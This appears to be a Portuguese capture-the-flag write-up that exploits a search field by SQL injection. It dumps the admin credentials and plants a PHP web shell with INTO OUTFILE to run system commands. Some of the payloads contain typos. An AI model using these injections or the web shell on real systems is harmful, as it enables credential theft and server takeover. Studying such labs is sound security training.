Tags: #ctf #injection 

Acessado a página web na porta 80 do servidor temos um porta com o campo "Search":
![[Pasted image 20250609082805.png]]
Digitando qualquer palavra é retornada a primeira flag:
![[Pasted image 20250609082914.png]]
![[Pasted image 20250609082951.png]]

O próximo passo é tentarmos injetar alguns comandos SQLi para verificar se esse parâmetro é vulnerável a SQL injection
**Primero, precisamos identificar o número de colunas na tabela.**
	`' union select 1,2,3,4,5,6#`
![[Pasted image 20250609083230.png]]
Não retornou nada então vamos aumentar o número de colunas:
	`' union select 1,2,3,4,5,6,7#`
![[Pasted image 20250609083331.png]]
Aparentemente temos 7 colunas, e o número 2 fir refletido, vamos usar a coluna 2 para obter informações do banco de dado:
	`'union select 1,@@version,3,4,5,6,7#`
![[Pasted image 20250609083537.png]]
O resultado da consulta é 5.5.68-Maria-DB, agora irei pegar o nome do banco de dados.
	`'union select 1,database(),3,4,5,6,7#`
![[Pasted image 20250609083744.png]]
Temos o nome do banco de dados, agora pegarei os nomes das tabelas desse banco de dados.
	`' union select 1,table_name,2,3,4,5,6,7 from information_schema.tables where table_schema = 'news'#`
![[Pasted image 20250609083936.png]]
Temos os nomes das 6 tabelas,a tabela mais importante para nos é a tabela "tbladmin", então iremos lastar as colunas dessa tabela.
	`' union select 1, column_name,3,4,5,6,7 from information_schema.colums where table_name = 'tbladmin'#`
![[Pasted image 20250609084133.png]]
Para nós as mais importantes são **AdminUserName & AdminPassword**, então irei pegar os valores dessas, aqui vamos usar a função 'concat' que me permite adicionar duas ou mais expressões juntas.
	`' union select 1,concat(AdminUserName,":",AdminPassword),3,4,5,6,7 from tbladmin#`
![[Pasted image 20250609084350.png]]
E conseguimos o hash de senha em Bycrypt do admin. O Bcrypt oferece uma maior segurança do que os outros algoritmos criptográficos porque contém uma variável que é proporcional à quantidade de processamento necessário para criptografar a informação desejada, tornando-o resistente a ataques do tipo “força-bruta”.

Portanto não será possivel quebrar esse hash. Mais, como temos Inejeção de SQL, podemos tentar escrever uma webshell php em algum diretório que temos permisão de escrita. **Payload**:
	<?php system($_GET['cmd']) ?>
Depois de testar alguns diretórios, como: /var/www/html, /var/www/html/images, /var/www/html/vendor. Consigo gravar no diretório /var/www/html/includes o arquivo cmd.php que contém a payload. Comando SQL utilizado para gravar o arquivo:
	`' union select 1,"<?php system ($_GET['cmd'] ?>",3,4,5,6,7 into outfile "/var/www/html/includes/cmd.php"#
Portanto se acessarmos /includes, veremos que nosso arquivo foi gravado com sucesso:
![[Pasted image 20250609085107.png]]Para executar comandos no sistema iremos passar `/includes/cmd.php?cmd=whoami`
Aqui vou utilizar o comando 'id':
 ![[Pasted image 20250609085307.png]]